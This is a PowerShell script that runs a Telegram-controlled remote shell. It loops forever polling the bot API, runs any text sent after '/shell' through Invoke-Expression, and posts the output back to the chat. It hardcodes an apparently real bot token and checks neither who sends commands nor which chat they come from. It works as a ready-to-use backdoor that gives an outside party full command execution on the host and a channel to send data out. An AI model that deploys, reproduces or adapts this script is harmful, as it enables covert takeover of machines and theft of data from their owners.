# Define your Telegram Bot API token here
$BotToken = "6396521064:AAEDS4cYhYuVicJWEYdd8vXDSgTzLGn2kGk"

# Create the Telegram API URL for sending messages
$TelegramAPI = "https://api.telegram.org/bot$BotToken/sendMessage"

# Function to execute PowerShell commands and send the output back to Telegram
function Execute-PowerShellCommand {
    param (
        [string]$ChatID,
        [string]$Command
    )

    $Output = Invoke-Expression -Command $Command 2>&1 | Out-String

    # Send the command output back to Telegram
    $Payload = @{
        chat_id = $ChatID
        text    = $Output
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $TelegramAPI -Method POST -Body $Payload -ContentType "application/json"
        Write-Host "PowerShell command executed successfully."
    } catch {
        Write-Host "Error sending message: $($_.Exception.Message)"
    }
}

# Listen for incoming Telegram messages and execute PowerShell commands
while ($true) {
    $Updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/getUpdates" -Method Get
    foreach ($Update in $Updates.result) {
        $MessageText = $Update.message.text
        $ChatID = $Update.message.chat.id

        if ($MessageText -eq "/shell") {
            # Reply with a message indicating that the shell is ready
            $Response = "PowerShell shell access is ready. Send PowerShell commands as text messages."

            $Payload = @{
                chat_id = $ChatID
                text    = $Response
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $TelegramAPI -Method POST -Body $Payload -ContentType "application/json"
        } elseif ($MessageText -match "^/shell\s(.+)$") {
            # Extract and execute the PowerShell command
            $CommandToExecute = $matches[1]
            Execute-PowerShellCommand -ChatID $ChatID -Command $CommandToExecute
        }
    }

    # Wait for a short period before checking for new messages again
    Start-Sleep -Seconds 5
}
